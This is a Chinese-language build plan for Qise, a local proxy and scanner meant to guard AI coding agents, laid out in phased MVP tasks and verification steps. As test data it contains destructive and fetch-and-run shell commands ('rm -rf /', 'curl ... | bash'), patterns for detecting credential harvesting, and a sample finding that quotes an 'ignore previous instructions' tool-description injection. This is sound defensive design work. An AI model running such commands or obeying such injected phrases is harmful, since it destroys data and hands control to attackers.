# Qise 产品化改造计划

本文档用于指导 Qise 从当前技术原型改造成一个普通用户可以安装、启用、理解并信任的 Agent 安全防护产品。

计划依据三部分信息制定：

- `qise_product_spec_v0.1.md` 中的 MVP 产品目标。
- 当前 Qise 代码状态，包括 CLI、Proxy、Bridge、Guard Pipeline、Desktop、Takeover、MCP/SDK 适配器。
- 方寸跃迁 Agent 安全产品组合的启发：Fangcun Observer、Fangcun Guard、Skill Ward。

执行原则：

- 每个阶段完成后必须先验证，通过后再进入下一阶段。
- 当前第一周目标是最小可用产品，可以安装、可以保护至少一个真实已安装 Agent、可以展示安全事件、可以恢复配置。
- 更强的 OS 层观测、沙箱动态执行、复杂模型 Guard 可以后置，但产品架构和数据模型要从第一周就打好。

---

## 1. 产品化目标理解

Qise 的目标不是继续堆叠更多 Guard，而是成为一个面向个人电脑和开发者 Agent 的轻量本地安全层。

面向用户的产品定位：

> Qise is a lightweight local security layer for coding and tool-using AI agents. It protects users from dangerous commands, secret leaks, unsafe file access, suspicious network requests, prompt injection, and risky third-party skills through a local proxy, preflight scanners, explainable events, and configurable guardrails.

对应中文表达：

> Qise 是一个轻量、本地优先的 AI Agent 安全防护工具，用来保护 Claude Code、Codex、OpenClaw 等工具型 Agent，防止危险命令、密钥泄露、敏感文件访问、可疑网络外联、Prompt Injection 和第三方 Skill 风险。

第一周 MVP 的核心不是实现最强防护，而是完成普通用户可感知的闭环：

1. 安装 Qise。
2. 启动 Qise。
3. 选择并保护已安装 Agent。
4. Qise 本地 proxy 介入 Agent 与模型 API 流量。
5. 危险操作被阻断或告警。
6. 用户看到清晰事件解释。
7. 用户可以暂停保护。
8. 用户可以一键恢复 Agent 原配置。

---

## 2. 从方寸跃迁产品组合中借鉴的关键设计

方寸跃迁产品组合可抽象为三层：

| 产品 | 防护阶段 | 核心思想 | 对 Qise 的启发 |
| --- | --- | --- | --- |
| Skill Ward | 事前 | 第三方 Skill 在安装或部署前先扫描 | Qise 需要 `scan skill` / `scan mcp`，把 SupplyChainGuard 产品化 |
| Fangcun Guard | 事中 | 输入、工具调用、模型输出、工具返回都要过安全审核 | Qise Guard Pipeline 要包装成用户能理解的风险类别和事件解释 |
| Fangcun Observer | 事中/事后 | 不只看 Agent 声明的 tool call，而要看真实系统行为 | Qise 后续要加入 Runtime Observer，先从轻量进程包装和事件证据开始 |

Qise 不应直接照搬企业级路线。第一周应该采用轻量路线：

- 先把 Proxy + Guard + Agent 配置接管跑通。
- 立刻补 Preflight 扫描入口，先做静态和规则扫描。
- 立刻补事件证据模型，确保后续 Observer、沙箱扫描、模型 Guard 都能共用同一套事件结构。
- OS 层行为观测放到第二周或第三周，不阻塞 MVP。

---

## 3. Qise 新产品架构命名

从第一周开始，Qise 对外按照三段式组织能力。

### 3.1 Qise Preflight

运行前安全检查。

目标：

- 扫描 Agent 配置。
- 扫描 MCP server 配置。
- 扫描 Claude Skill、OpenAI App、OpenClaw Skill 等第三方 Skill 包。
- 检测工具描述投毒、可疑安装脚本、危险命令、敏感环境变量、未知来源、基线 hash 变化。

第一周必须实现的最小能力：

```bash
qise scan skill /path/to/skill
qise scan mcp /path/to/mcp-config.json
qise scan agent-config codex
```

第一周可以只做规则扫描和结构化报告，不要求 Docker 沙箱。

### 3.2 Qise Shield

运行中 proxy / guard 防护。

目标：

- 作为普通用户默认路径。
- 拦截 OpenAI-compatible `/v1/chat/completions`。
- 检查用户输入、工具定义、工具调用、工具参数、模型输出、工具返回。
- 阻断高置信危险行为。
- 记录结构化事件。

第一周必须实现的最小能力：

```bash
qise protect codex
qise protect openclaw
qise status
qise events
qise restore codex
qise stop
```

Claude Code 可以保留为 experimental，除非同时补齐 Anthropic `/v1/messages` 支持。

### 3.3 Qise Observer

运行时真实行为观测。

目标：

- 观察 Agent 真实执行的命令、文件读写、网络外联、持久化行为。
- 把真实行为与 proxy 事件、tool call、模型上下文关联起来。
- 形成完整证据链。

第一周不做完整 OS 层 Observer，但要完成事件模型预留：

- `stage=runtime`
- `action=process/file/network`
- `resource`
- `process`
- `evidence`
- `correlation_id`

第二周可以从 `qise run --agent codex -- <command>` 这种轻量 wrapper 开始，逐步增加真实行为记录。

---

## 4. 总体阶段路线

| 阶段 | 时间建议 | 阶段主题 | 完成后效果 |
| --- | --- | --- | --- |
| Phase 0 | 第 0.5 天 | 仓库体检与发布卫生 | 明确当前可用/不可用能力，清理发布风险 |
| Phase 1 | 第 1-2 天 | CLI 产品骨架 | 用户能用 `qise doctor/status/protect/restore/events` 操作 Qise |
| Phase 2 | 第 2-4 天 | Proxy + Agent 接管闭环 | 至少一个真实 Agent 被 Qise proxy 保护，并可恢复 |
| Phase 3 | 第 3-5 天 | Preflight 与事件证据模型 | `qise scan skill/mcp` 可用，事件解释清晰 |
| Phase 4 | 第 5-6 天 | 安装、文档、Demo | 普通用户可按 README 在 5 分钟内跑通 |
| Phase 5 | 第 6-7 天 | Release 验收与宣传材料 | 可发 GitHub、可录 Demo、可宣传 MVP |
| Phase 6 | 第二周 | Runtime Observer | 补真实行为观测，接近 Fangcun Observer 思路 |
| Phase 7 | 第二周/第三周 | Skill 沙箱与动态扫描 | Preflight 从静态扫描升级为沙箱验证 |
| Phase 8 | 第三周以后 | 高级 Guard 与企业能力 | SLM、策略模板、多 Agent 图谱、组织级管理 |

---

## 5. Phase 0：仓库体检与发布卫生

### 5.1 阶段目标

先确认当前仓库的真实状态，不在不确定基础上包装产品。

完成后效果：

- 知道 CLI、Proxy、Bridge、Desktop、MCP、SDK 哪些真实可用。
- 发现并修复明显会破坏发布的问题。
- README 和产品声明不再过度宣传未验证能力。

### 5.2 改造任务

1. 建立干净 Python 3.11+ 环境。
2. 安装依赖并运行基础命令：

   ```bash
   qise version
   qise init
   qise guards
   qise check bash '{"command":"rm -rf /"}'
   qise proxy start --port 8822 --upstream https://api.openai.com
   qise bridge start --port 8823
   ```

3. 跑现有测试。
4. 检查 `pyproject.toml`、README、README_CN、产品文档中的版本、仓库 URL、安装方式是否一致。
5. 清理发布风险文件：

   - 不应把测试用 poisoned baseline 放在默认 package data 中。
   - 未跟踪的本地 `shield.yaml` 不应被误当成默认产品配置。

6. 修复明显 bug：

   - Bridge 中 `pipeline.all_guards` 属性被当函数调用的问题。
   - Desktop/Bridge guard list、set mode 接口必须可用。

### 5.3 交付物

- `docs/current-state-audit.md`
- 修正后的 README 状态声明。
- 通过基础 CLI smoke test。
- 发布风险文件被移除、迁移到 tests/fixtures，或明确加入 `.gitignore`。

### 5.4 验证步骤

用户验证：

1. 删除本地旧虚拟环境，重新创建干净环境。
2. 运行：

   ```bash
   python3.11 -m venv .venv
   source .venv/bin/activate
   pip install -e ".[dev,proxy]"
   qise version
   qise init --force
   qise guards
   qise check bash '{"command":"rm -rf /"}'
   ```

3. 预期结果：

   - `qise version` 正常输出版本。
   - `qise guards` 能列出所有 Guard。
   - `qise check` 对 `rm -rf /` 返回 BLOCK。

4. 运行测试：

   ```bash
   pytest
   ```

5. 通过标准：

   - 基础命令没有 import error。
   - 高危命令被阻断。
   - 没有明显发布污染文件。

通过后进入 Phase 1。

---

## 6. Phase 1：CLI 产品骨架

### 6.1 阶段目标

把 Qise 从“框架命令集合”改造成普通用户能理解的产品 CLI。

完成后效果：

```bash
qise doctor
qise status
qise protect codex
qise restore codex
qise events
qise stop
qise scan skill /path/to/skill
qise scan mcp /path/to/mcp.json
```

这些命令先不要求能力全部完美，但必须有稳定输出、清晰错误、可脚本化退出码。

### 6.2 改造任务

#### 6.2.1 新增 `qise doctor`

检查项：

- Python 版本是否满足。
- Qise 包是否安装完整。
- 配置文件位置。
- Proxy 端口是否可用。
- Bridge 端口是否可用。
- 上游模型 API base URL 是否配置。
- 已安装 Agent 检测结果。
- Agent 是否已被 Qise 保护。
- 事件日志路径是否可写。
- 可选 SLM 是否可用。

输出示例：

```text
Qise Doctor

Runtime
  Python: 3.11.8 OK
  Qise: 0.2.0 OK

Services
  Proxy port 8822: available
  Bridge port 8823: available

Agents
  Codex: installed, not protected
  OpenClaw: not found
  Claude Code: installed, experimental

Config
  Upstream: configured
  Event log: writable

Result: ready
```

#### 6.2.2 新增 `qise status`

状态项：

- Qise 是否运行。
- Proxy 地址。
- Bridge 状态。
- 当前保护的 Agent。
- 最近 24 小时 block/warn 数。
- 最近一条事件。

#### 6.2.3 新增 `qise protect`

命令：

```bash
qise protect codex
qise protect openclaw
qise protect claude-code --experimental
qise protect custom --base-url <url>
```

第一周实现：

- Codex 和 OpenClaw 至少一个必须真实可用。
- Claude Code 如果没有 Anthropic API 支持，只允许 experimental，并在输出中明确说明限制。

#### 6.2.4 新增 `qise restore`

命令：

```bash
qise restore codex
qise restore openclaw
qise restore all
```

要求：

- 所有修改 Agent 配置的操作都必须先备份。
- 备份位置默认在 `~/.qise/backups/`。
- restore 失败必须给出原始备份路径。

#### 6.2.5 新增 `qise events`

命令：

```bash
qise events
qise events --limit 20
qise events --json
qise events --since 1h
```

第一周可以基于 JSONL。

#### 6.2.6 新增 `qise stop`

停止 Qise 后台服务。

第一周如果暂时没有 daemon，可以做到：

- 停止已知 pidfile 中的 proxy/bridge。
- 或提示用户当前是前台模式，需要 Ctrl+C。

### 6.3 代码建议

新增模块：

```text
src/qise/product/
  __init__.py
  doctor.py
  status.py
  service.py
  agents.py
  events.py
  scan.py
```

CLI 只负责解析参数，业务逻辑放到 `qise.product`。

### 6.4 交付物

- CLI 新命令可运行。
- 输出对普通用户友好。
- 每个命令有非 0 退出码规则。
- README Quickstart 使用新命令。

### 6.5 验证步骤

用户验证：

1. 安装本地包：

   ```bash
   pip install -e ".[dev,proxy]"
   ```

2. 运行：

   ```bash
   qise doctor
   qise status
   qise events
   qise scan mcp examples/mcp-safe.json
   ```

3. 预期结果：

   - `doctor` 输出完整诊断，不崩溃。
   - `status` 即使 Qise 未启动，也给出清楚状态。
   - `events` 没有日志时显示空列表，而不是报错。
   - `scan mcp` 对安全配置返回 PASS。

4. 再运行一个恶意 MCP 配置扫描：

   ```bash
   qise scan mcp examples/mcp-dangerous.json
   ```

5. 预期结果：

   - 包含 `curl | bash` 或敏感 env 的配置返回 WARN/BLOCK。
   - 输出包含风险类型、证据、建议。

通过后进入 Phase 2。

---

## 7. Phase 2：Proxy + Agent 接管闭环

### 7.1 阶段目标

完成第一周最核心能力：普通用户能保护已安装 Agent。

完成后效果：

1. 用户运行 `qise protect codex`。
2. Qise 自动备份 Codex 配置。
3. Qise 修改 Codex provider/base URL 指向本地 proxy。
4. Qise 启动 proxy/bridge。
5. Codex 请求经过 Qise。
6. 高危 tool call 被阻断。
7. 用户运行 `qise restore codex` 恢复原配置。

### 7.2 改造任务

#### 7.2.1 统一 Agent 配置管理

新增 `AgentConfigManager`。

职责：

- detect：检测 Agent 是否安装。
- locate_config：定位配置文件。
- read_config：读取配置。
- backup_config：备份原始配置。
- patch_config：写入 Qise proxy provider。
- verify_patch：确认 patch 生效。
- restore_config：恢复备份。

第一周 Agent 优先级：

1. Codex。
2. OpenClaw。
3. Generic OpenAI-compatible。
4. Claude Code experimental。

#### 7.2.2 明确 Claude Code 限制

如果当前只支持 OpenAI-compatible proxy，则 Claude Code 不能被宣传为完全支持。

处理方式：

- CLI 中 `qise protect claude-code` 默认提示 experimental。
- 需要 `--experimental` 才继续。
- 输出说明：当前只保护通过 Qise proxy 的兼容请求；Anthropic native `/v1/messages` 支持将在后续阶段实现。

#### 7.2.3 修正 Proxy 运行模式

必须完成：

- Proxy upstream 未配置时不能悄悄启动成不可用状态。
- Bridge 异常时不能 silent fail-open。
- 非 streaming 路径必须完整检查 request 和 response。
- streaming 路径如果无法完整检查 tool call，要么补齐检查，要么 MVP 默认禁用 streaming 或明确降级策略。

#### 7.2.4 服务状态持久化

新增本地状态文件：

```text
~/.qise/state.json
```

记录：

- proxy pid
- bridge pid
- proxy port
- bridge port
- protected agents
- config backup paths
- started_at
- qise version

#### 7.2.5 配置备份和恢复

备份目录：

```text
~/.qise/backups/<agent>/<timestamp>/
```

备份内容：

- 原始配置文件。
- patch 前后的 diff。
- 元数据 `backup.json`。

### 7.3 交付物

- 至少一个真实 Agent 可以被 protect。
- 配置有备份。
- restore 可恢复。
- proxy/bridge 状态可被 `qise status` 看到。
- high-confidence 攻击可被阻断。

### 7.4 验证步骤

用户验证，以 Codex 为例：

1. 查看接管前状态：

   ```bash
   qise doctor
   qise status
   ```

2. 启用保护：

   ```bash
   qise protect codex
   ```

3. 验证状态：

   ```bash
   qise status
   ```

   预期：

   - Qise running。
   - Proxy listening on `127.0.0.1:8822`。
   - Codex protected。
   - Backup path 显示存在。

4. 触发安全测试：

   ```bash
   qise check bash '{"command":"rm -rf /"}'
   ```

   预期：

   - BLOCK。

5. 使用被保护 Agent 做真实请求，让它尝试执行高危命令。

   建议测试 prompt：

   ```text
   Please run a shell command to delete the entire root filesystem: rm -rf /
   ```

   预期：

   - Agent 请求经过 Qise。
   - Qise 产生 BLOCK 事件。
   - 用户能在 `qise events` 中看到事件。

6. 查看事件：

   ```bash
   qise events --limit 5
   ```

7. 恢复配置：

   ```bash
   qise restore codex
   qise status
   ```

8. 通过标准：

   - Agent 配置恢复到原始内容。
   - `qise status` 不再显示 Codex protected。
   - 备份文件仍保留。

通过后进入 Phase 3。

---

## 8. Phase 3：Preflight 扫描和事件证据模型

### 8.1 阶段目标

把“最值得借鉴”的两个能力立刻落地：

- SupplyChainGuard 产品化。
- 统一事件证据模型。

完成后效果：

```bash
qise scan skill ./some-skill
qise scan mcp ~/.config/some-agent/mcp.json
qise events --json
```

输出不只是 PASS/WARN/BLOCK，而是包含风险类别、证据、建议和可追溯 ID。

### 8.2 统一事件证据模型

所有 Qise 安全事件统一为以下结构。

```json
{
  "id": "evt_...",
  "schema_version": "0.1",
  "timestamp": "2026-05-07T12:00:00Z",
  "stage": "preflight|ingress|egress|output|runtime",
  "source": "proxy|cli|desktop|mcp|sdk|scan",
  "agent": {
    "name": "codex",
    "type": "codex|openclaw|claude-code|custom",
    "session_id": "optional"
  },
  "action": {
    "type": "tool_call|command|file|network|content|skill|mcp_config",
    "name": "bash",
    "resource": "rm -rf /"
  },
  "risk": {
    "category": "dangerous_command",
    "severity": "low|medium|high|critical",
    "confidence": 0.95
  },
  "decision": {
    "verdict": "pass|warn|block",
    "mode": "observe|enforce|off",
    "blocked_by": ["command"]
  },
  "evidence": [
    {
      "type": "regex|hash|llm|baseline|policy|runtime",
      "rule_id": "command.rm_rf_root",
      "message": "Command matches critical deny pattern",
      "snippet": "rm -rf /"
    }
  ],
  "recommendation": "Do not allow the agent to run this command. Review the task and restore files from backup if needed.",
  "correlation_id": "corr_...",
  "raw_ref": "optional path or request id"
}
```

第一周要求：

- `qise check`、proxy、bridge、`qise scan` 都写入同一种 JSONL 事件。
- `qise events` 默认显示人类友好摘要。
- `qise events --json` 输出原始 JSON。

### 8.3 风险类别产品化

把内部 Guard 名称映射为用户可理解的类别：

| Guard | 产品风险类别 |
| --- | --- |
| CommandGuard | Dangerous Commands |
| CredentialGuard | Secret Leakage |
| FilesystemGuard | Sensitive Files |
| NetworkGuard | Unsafe Network |
| PromptGuard | Prompt Injection |
| ToolSanityGuard | Tool Poisoning |
| SupplyChainGuard | Skill Supply Chain |
| ExfilGuard | Data Exfiltration |
| ResourceGuard | Resource Abuse |
| AuditGuard | Suspicious Behavior Chain |

### 8.4 SupplyChainGuard 产品化

新增 `qise scan`。

#### 8.4.1 `qise scan skill`

输入：

- skill 文件夹。
- zip/tar 包可后续支持，第一周可以只支持文件夹。

扫描项：

- README / manifest / metadata 中的隐藏指令。
- tool description 中的 prompt injection。
- install 脚本中的 `curl | bash`、`wget | sh`。
- postinstall / setup 脚本。
- 可疑网络域名。
- 敏感文件读取。
- `.env`、SSH key、API key harvesting。
- Base64/hex 混淆片段。

输出：

```text
Qise Preflight Scan

Target: ./skills/demo
Verdict: BLOCK
Risk: Skill Supply Chain / high

Evidence
  - install.sh contains curl | bash
  - tool description asks agent to ignore previous instructions

Recommendation
  Do not install this skill. Remove remote install script and review tool description.
```

#### 8.4.2 `qise scan mcp`

输入：

- MCP JSON 配置。

扫描项：

- command 是否包含远程下载执行。
- env 是否包含敏感变量。
- server source 是否未知。
- args 是否包含 shell 拼接。
- 是否引用本地敏感路径。

#### 8.4.3 `qise scan agent-config`

输入：

```bash
qise scan agent-config codex
qise scan agent-config openclaw
```

检查：

- Agent 当前 provider 是否指向 Qise proxy。
- 是否存在未知/可疑 MCP server。
- 是否有敏感 env 暴露给工具。
- 是否存在未经备份的 Qise patch。

### 8.5 交付物

- 新事件模型 dataclass / Pydantic model。
- JSONL event store。
- `qise events` 人类友好输出。
- `qise scan skill`。
- `qise scan mcp`。
- SupplyChainGuard 规则扩展。
- 示例安全/危险 skill、MCP 配置 fixtures。

### 8.6 验证步骤

用户验证：

1. 扫描安全 Skill：

   ```bash
   qise scan skill examples/skills/safe
   ```

   预期：PASS 或低风险 WARN。

2. 扫描危险 Skill：

   ```bash
   qise scan skill examples/skills/dangerous
   ```

   预期：BLOCK，并显示证据。

3. 扫描危险 MCP：

   ```bash
   qise scan mcp examples/mcp-dangerous.json
   ```

   预期：BLOCK 或 high WARN。

4. 查看事件：

   ```bash
   qise events --limit 10
   qise events --limit 10 --json
   ```

5. 验证 JSON 字段：

   - 必须有 `id`。
   - 必须有 `stage`。
   - 必须有 `risk.category`。
   - 必须有 `decision.verdict`。
   - 必须有 `evidence`。
   - 必须有 `recommendation`。

通过后进入 Phase 4。

---

## 9. Phase 4：安装、文档和 Demo 闭环

### 9.1 阶段目标

让普通用户可以在 5 分钟内完成安装和第一次防护。

完成后效果：

- README 首页只展示 verified 能力。
- Quickstart 可复制执行。
- 有一个完整 Demo：安装、protect、触发危险行为、查看事件、restore。
- 可以用于 GitHub 宣传。

### 9.2 改造任务

#### 9.2.1 安装方式

第一周至少提供一种可靠方式：

```bash
pipx install qise
```

如果还未发布 PyPI，则提供源码安装：

```bash
git clone <repo>
cd qise
python3.11 -m venv .venv
source .venv/bin/activate
pip install -e ".[proxy]"
```

macOS app/DMG 可以作为加分项，不作为第一周唯一安装方式。

#### 9.2.2 README 重写

README 第一屏：

- 一句话定位。
- 保护对象。
- 30 秒 Demo GIF。
- 三个命令跑通：

```bash
qise doctor
qise protect codex
qise events
```

必须避免：

- 宣传未验证 Agent。
- 宣传未实现 OS 层真实行为阻断。
- 宣传 streaming 完整支持，除非已验证。
- 宣传 Claude Code 完整支持，除非 Anthropic native API 已实现。

#### 9.2.3 文档结构

建议：

```text
docs/
  quickstart.md
  install.md
  codex.md
  openclaw.md
  claude-code.md
  preflight-scan.md
  events.md
  privacy.md
  troubleshooting.md
  current-state-audit.md
```

#### 9.2.4 Demo 脚本

新增：

```text
scripts/demo_mvp.sh
scripts/demo_scan.sh
```

Demo 目标：

- 不需要真实危险操作。
- 使用模拟 tool call 或本地 fixture。
- 可稳定录屏。

### 9.3 交付物

- README Quickstart。
- 安装说明。
- 至少一个 Agent 接入文档。
- Preflight scan 文档。
- Demo 脚本。
- Privacy 文档。

### 9.4 验证步骤

用户验证：

1. 找一台尽量干净的机器或新 shell。
2. 按 README 从头执行，不看源码。
3. 计时是否能在 5 分钟内完成：

   ```bash
   qise doctor
   qise protect codex
   qise status
   qise check bash '{"command":"rm -rf /"}'
   qise events
   qise restore codex
   ```

4. 预期：

   - 每一步都有可理解输出。
   - 出错时有清楚修复建议。
   - `restore` 可以恢复。

5. 让一个未参与开发的人按 README 操作。

通过标准：

- 新用户不需要理解 Qise 内部架构。
- 新用户知道 Qise 是否正在保护。
- 新用户能看到至少一条安全事件。
- 新用户能恢复配置。

通过后进入 Phase 5。

---

## 10. Phase 5：第一周 Release 验收与宣传准备

### 10.1 阶段目标

把第一周成果包装成可以宣传的 MVP。

完成后效果：

- GitHub README 可公开推广。
- 有明确 Star CTA。
- 有真实 Demo。
- 有投资人能看懂的产品故事。

### 10.2 改造任务

#### 10.2.1 Release Checklist

新增：

```text
docs/release-checklist.md
```

内容：

- 安装验证。
- CLI 验证。
- Agent protect 验证。
- restore 验证。
- scan 验证。
- events 验证。
- README 链接验证。

#### 10.2.2 GitHub 页面包装

README 顶部建议结构：

```text
# Qise

Lightweight local security for AI coding agents.

[Demo GIF]

Protect Codex, OpenClaw, and OpenAI-compatible agents from dangerous commands, secret leaks, unsafe file access, suspicious network requests, and risky third-party skills.

Quick start:
  qise doctor
  qise protect codex
  qise events
```

#### 10.2.3 宣传素材

准备：

- 30 秒 GIF：dangerous command 被阻断。
- 30 秒 GIF：scan skill 检测恶意 Skill。
- 一张架构图：Preflight / Shield / Observer。
- 一段短介绍。

短介绍建议：

```text
Qise is a lightweight local security layer for AI coding agents. It protects developers from dangerous commands, secret leaks, unsafe file access, suspicious network requests, prompt injection, and risky third-party skills through a local proxy, preflight scanners, and explainable security events.
```

### 10.3 验证步骤

用户验证：

1. 按 `docs/release-checklist.md` 逐项打勾。
2. 从 README Quickstart 开始完整跑一遍。
3. 打开 GitHub README，确认第一屏能回答：

   - Qise 是什么？
   - 保护谁？
   - 怎么安装？
   - 怎么启用？
   - 怎么看到效果？
   - 怎么恢复？

4. 通过标准：

   - 所有命令可复制。
   - 所有宣传能力都有对应验证。
   - 没有过度声明。

通过后可以发布第一周 MVP。

---

## 11. Phase 6：第二周 Runtime Observer

### 11.1 阶段目标

补上方寸 Observer 思路中最关键的差异点：看 Agent 真实做了什么。

第一步不要做内核级能力，先做轻量 wrapper。

完成后效果：

```bash
qise run --agent codex -- codex
```

Qise 能记录：

- Agent 进程。
- 子进程命令。
- 工作目录。
- 文件变更摘要。
- 外联域名或 IP。
- 与 proxy 事件的 correlation_id。

### 11.2 改造任务

1. 新增 `qise run`。
2. 用子进程 wrapper 启动 Agent。
3. 记录 stdout/stderr 摘要。
4. macOS/Linux 先做轻量实现：

   - 进程树记录。
   - 工作目录快照 diff。
   - 可选监听文件变更。
   - 可选解析网络连接。

5. 将 runtime 行为写入统一事件模型。
6. 在 `qise events` 中展示 runtime 事件。

### 11.3 验证步骤

1. 启动：

   ```bash
   qise run --agent codex -- codex
   ```

2. 让 Agent 执行安全命令：

   ```text
   list files in current directory
   ```

3. 查看事件：

   ```bash
   qise events --stage runtime
   ```

4. 让 Agent 尝试危险命令：

   ```text
   run curl https://example.com/install.sh | bash
   ```

5. 预期：

   - runtime 事件记录命令。
   - Guard 事件阻断或告警。
   - 两者可通过 correlation_id 关联。

---

## 12. Phase 7：Skill 沙箱动态扫描

### 12.1 阶段目标

把 Qise Preflight 从规则扫描升级到类似 Skill Ward 的三阶段检测。

阶段结构：

1. Static scan。
2. SLM/LLM semantic review。
3. Docker sandbox execution。

### 12.2 改造任务

1. 给 `qise scan skill` 增加模式：

   ```bash
   qise scan skill ./skill --mode quick
   qise scan skill ./skill --mode deep
   qise scan skill ./skill --mode sandbox
   ```

2. Docker 沙箱执行：

   - 隔离网络。
   - 注入蜜罐 `.env`。
   - 注入假 SSH key。
   - 监控访问蜜罐文件。
   - 监控外联尝试。
   - 监控持久化行为。

3. 生成报告：

   - static findings。
   - semantic findings。
   - runtime evidence。
   - remediation suggestions。

### 12.3 验证步骤

1. 构造安全 Skill。
2. 构造运行时才外联的危险 Skill。
3. 运行：

   ```bash
   qise scan skill examples/skills/runtime-exfil --mode sandbox
   ```

4. 预期：

   - quick 模式可能 WARN。
   - sandbox 模式必须捕获真实外联或蜜罐文件访问。

---

## 13. Phase 8：高级 Guard、策略模板和企业能力

### 13.1 阶段目标

在 MVP 跑通之后，再追求更强防护。

方向：

- 本地 SLM。
- 中文场景优化。
- 风险类别阈值可调。
- 多 Agent 行为图谱。
- 组织策略模板。
- 企业审计导出。

### 13.2 改造任务

1. Balanced / Strict / Observe 三种模式。
2. 每个风险类别可调：

   - Dangerous Commands
   - Secret Leakage
   - Sensitive Files
   - Unsafe Network
   - Prompt Injection
   - Skill Supply Chain

3. 本地 SLM 自动发现：

   - Ollama。
   - LM Studio。
   - OpenAI-compatible local endpoint。

4. 事件图谱：

   - 同一 Agent session 的多步行为。
   - Prompt injection 到 tool call 的链路。
   - Skill 到网络外联的链路。

5. Desktop UI 增强：

   - Agent cards。
   - Event detail。
   - Restore center。
   - Risk category toggles。
   - Privacy status。

### 13.3 验证步骤

1. 切换模式：

   ```bash
   qise mode observe
   qise mode balanced
   qise mode strict
   ```

2. 验证同一危险行为在不同模式下的结果。
3. 启用本地 SLM 后验证 prompt injection 检测提升。
4. 导出事件报告。

---

## 14. 第一周 MVP 详细施工顺序

第一周不按“模块兴趣”施工，而按用户闭环施工。

### Day 1：体检和 CLI 骨架

目标：

- Phase 0 完成。
- `qise doctor/status/events` 可运行。

任务：

- 建干净环境。
- 修 import/runtime 问题。
- 修 Bridge guard list bug。
- 新增事件日志路径。
- 新增 CLI 骨架。

验收：

```bash
qise doctor
qise status
qise events
qise check bash '{"command":"rm -rf /"}'
```

### Day 2：Agent 接管和恢复

目标：

- 一个 Agent 能 protect/restore。

任务：

- 实现 AgentConfigManager。
- Codex 或 OpenClaw 先跑通一个。
- 配置备份。
- restore。
- state.json。

验收：

```bash
qise protect codex
qise status
qise restore codex
```

### Day 3：Proxy 防护闭环

目标：

- 被保护 Agent 的请求真实经过 Qise。
- 危险 tool call 被阻断。

任务：

- 修 upstream 配置。
- 修 fail-open。
- 补 response/tool_call 事件。
- streaming 策略明确。

验收：

```bash
qise protect codex
qise events --limit 5
```

并用真实 Agent 触发危险命令测试。

### Day 4：Preflight 扫描

目标：

- SupplyChainGuard 产品化。

任务：

- `qise scan skill`。
- `qise scan mcp`。
- 扩展规则。
- 添加 examples fixtures。

验收：

```bash
qise scan skill examples/skills/safe
qise scan skill examples/skills/dangerous
qise scan mcp examples/mcp-dangerous.json
```

### Day 5：事件证据模型和文档

目标：

- 所有安全动作都有统一事件。
- README Quickstart 可用。

任务：

- Event model。
- JSONL store。
- events human output。
- events JSON output。
- README 改写。

验收：

```bash
qise events
qise events --json
```

### Day 6：安装和 Demo

目标：

- 新用户 5 分钟跑通。

任务：

- 安装文档。
- Demo 脚本。
- Troubleshooting。
- Privacy。

验收：

- 找干净 shell 按 README 操作。
- 录制 Demo GIF。

### Day 7：Release 验收

目标：

- 可宣传的 MVP。

任务：

- release checklist。
- README polish。
- demo GIF。
- Star CTA。
- 投资人版一句话介绍。

验收：

- 按 checklist 全部通过。
- 所有宣传点都有验证证据。

---

## 15. 第一周必须完成和可以延后的边界

### 15.1 第一周必须完成

- `qise doctor`
- `qise status`
- `qise protect <agent>`
- `qise restore <agent>`
- `qise events`
- `qise scan skill`
- `qise scan mcp`
- 统一事件证据模型。
- 至少一个真实 Agent 的 protect/restore。
- OpenAI-compatible proxy 防护闭环。
- README Quickstart。
- Demo。

### 15.2 第一周可以只做基础版

- Desktop UI。
- Claude Code。
- OpenClaw 和 Codex 二者中的第二个。
- 本地 SLM。
- streaming tool call 深度检查。
- macOS DMG。

### 15.3 第一周不要做

- 完整 OS 层 Endpoint Security。
- Docker 蜜罐沙箱。
- 企业控制台。
- 多 Agent 行为图谱。
- 复杂云端策略同步。
- 大规模 benchmark。

这些会拖慢 MVP。第一周的胜利标准是“可安装、可保护、可解释、可恢复、可展示”。

---

## 16. 每阶段通用验收门槛

每个阶段完成后都必须检查：

1. 用户路径是否更简单。
2. 是否有可复制命令。
3. 是否有清晰错误信息。
4. 是否有事件记录。
5. 是否不破坏 restore。
6. 是否不夸大未验证能力。
7. 是否通过 smoke test。
8. 是否更新 README 或 docs。

如果以上任一项不满足，不进入下一阶段。

---

## 17. 后续让 Codex 执行时的推荐指令格式

每次只执行一个阶段，避免并行改太多导致验证困难。

推荐复制给 Codex 的格式：

```text
请按照 build_plan.md 的 Phase 1 执行改造。
只做 Phase 1 的范围，不进入 Phase 2。
完成后告诉我修改了哪些文件，以及我该如何按 build_plan.md 的验证步骤验收。
```

如果某个阶段太大，继续拆：

```text
请只执行 build_plan.md Phase 1 中的 qise doctor 和 qise status。
不要实现 protect/restore。
完成后给出验证步骤。
```

---

## 18. 当前最推荐的下一步

下一步应从 Phase 0 + Phase 1 开始。

具体第一条任务：

```text
请按照 build_plan.md 的 Phase 0 执行仓库体检与发布卫生改造。
完成后不要进入 Phase 1。
请给出 docs/current-state-audit.md，并告诉我如何验证。
```

Phase 0 通过后，再执行：

```text
请按照 build_plan.md 的 Phase 1 执行 CLI 产品骨架改造。
完成 qise doctor、qise status、qise events 的基础版本。
完成后告诉我如何验证。
```

